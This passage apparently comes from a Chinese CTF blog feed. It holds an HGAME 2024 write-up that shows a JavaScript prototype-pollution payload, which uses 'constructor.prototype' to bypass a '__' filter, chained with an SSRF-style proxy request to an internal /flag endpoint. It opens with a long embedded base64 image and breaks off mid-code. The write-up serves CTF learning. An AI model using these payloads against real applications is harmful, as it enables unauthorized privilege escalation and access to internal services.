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" alt="img"></p><p>使用 <a href="https://merri.cx/qrazybox/">QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx)</a> 中的 Brute Foce 模式</p><p>得到</p><p><img src="/posts/feba5816/image-20240221235954557.png" alt="image-20240221235954557"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME-2024-WEEK-3 WriteUps</title>
    <link href="/posts/7bf98902/"/>
    <url>/posts/7bf98902/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="WebVPN"><a href="#WebVPN" class="headerlink" title="WebVPN"></a>WebVPN</h2><p>考察原型链污染</p><p>审计源码，明显看到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">dst, src</span>) &#123;<br>  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> src) &#123;<br>    <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;__&#x27;</span>) != -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">continue</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> src[key] == <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; dst[key] !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-title function_">update</span>(dst[key], src[key])<br>      <span class="hljs-keyword">continue</span><br>    &#125;<br>    dst[key] = src[key]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/posts/7bf98902/image-20240221205347730.png" alt="image-20240221205347730"></p><p>过滤了 <code>__</code> ，这里可以使用<a href="https://juejin.cn/post/6963950629240733727">前端原型链污染漏洞竟可以拿下服务器shell？ - 掘金 (juejin.cn)</a></p><p><code>&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;&#125;</code> 也可以实现污染</p><p><img src="/posts/7bf98902/image-20240221205037939.png" alt="image-20240221205037939"></p><p>可以看到需要满足三个条件，遂构造</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:3000&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;hostname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>or </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:3000&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;hostname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/posts/7bf98902/image-20240221204046254.png" alt="image-20240221204046254"></p><p>用 Burp 打开并登录（这里要跳到 &#x2F;home 渲染之后再进行下一步</p><p>选择 HTTP历史记录 ，&#x2F;user&#x2F;login 发送到 Repeater</p><p><img src="/posts/7bf98902/image-20240221204445388.png" alt="image-20240221204445388"></p><p><img src="/posts/7bf98902/image-20240221211250652.png" alt="image-20240221211250652"></p><p>剩下一个 &#x2F;proxy</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/proxy&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; username &#125; = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">if</span> (!username) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">let</span> url = (<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span>);<br>    &#125; <span class="hljs-keyword">catch</span> &#123;<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid url.&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;<br>    &#125;<br>  &#125;)();<br><br>  <span class="hljs-keyword">if</span> (!url) <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-keyword">if</span> (!userStorage[username].<span class="hljs-property">strategy</span>[url.<span class="hljs-property">hostname</span>]) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;your url is not allowed.&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> headers = req.<span class="hljs-property">headers</span>;<br>    headers.<span class="hljs-property">host</span> = url.<span class="hljs-property">host</span>;<br>    headers.<span class="hljs-property">cookie</span> = headers.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;;&quot;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">cookie</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">var</span> filtered_cookie = <span class="hljs-string">&quot;&quot;</span>;<br>      <span class="hljs-keyword">const</span> [key, value] = cookie.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">trim</span>() !== session_name) &#123;<br>        filtered_cookie += <span class="hljs-string">`<span class="hljs-subst">$&#123;key&#125;</span>=<span class="hljs-subst">$&#123;value&#125;</span>;`</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> filtered_cookie;<br>    &#125;);<br>    <span class="hljs-keyword">const</span> remote_res = <span class="hljs-keyword">await</span> (<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">post</span>(url, req.<span class="hljs-property">body</span>, &#123;<br>          <span class="hljs-attr">headers</span>: headers,<br>        &#125;);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;GET&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">get</span>(url, &#123;<br>          <span class="hljs-attr">headers</span>: headers,<br>        &#125;);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">405</span>);<br>        res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;method not allowed.&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;)();<br>    res.<span class="hljs-title function_">status</span>(remote_res.<span class="hljs-property">status</span>);<br>    res.<span class="hljs-title function_">header</span>(remote_res.<span class="hljs-property">headers</span>);<br>    res.<span class="hljs-title function_">write</span>(remote_res.<span class="hljs-property">data</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;unreachable url.&quot;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>可以知道需要通过<img src="/posts/7bf98902/image-20240221212052944.png" alt="image-20240221212052944">检查</p><p>猜测用 <code>/proxy?url=127.0.0.1:3000/flag</code> 通过 &#x2F;flag 的条件</p><p>遂追加</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:3000&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;hostname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// &lt;---</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>用 Repeater 改成 &#x2F;user&#x2F;info请求 进行原型链污染</p><p><img src="/posts/7bf98902/image-20240221213620339.png" alt="image-20240221213620339"></p><p>刷新得到<img src="/posts/7bf98902/image-20240221214032213.png" alt="image-20240221214032213"></p><p>访问 <code>http://47.102.184.100:32008/proxy?url=http://127.0.0.1:3000/flag</code> 得到 flag</p><h2 id="Zero-Link"><a href="#Zero-Link" class="headerlink" title="Zero Link"></a>Zero Link</h2><p><img src="/posts/7bf98902/image-20240221214452699.png" alt="image-20240221214452699"></p><p>呕🤢~~~</p><p>审计可以知道只有Admin能登录</p><p>发现数据表</p><p><img src="/posts/7bf98902/image-20240221214748707.png" alt="image-20240221214748707"></p><p>（尝试登录—&gt;失败</p><p>F12 控制台尝试传空值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs 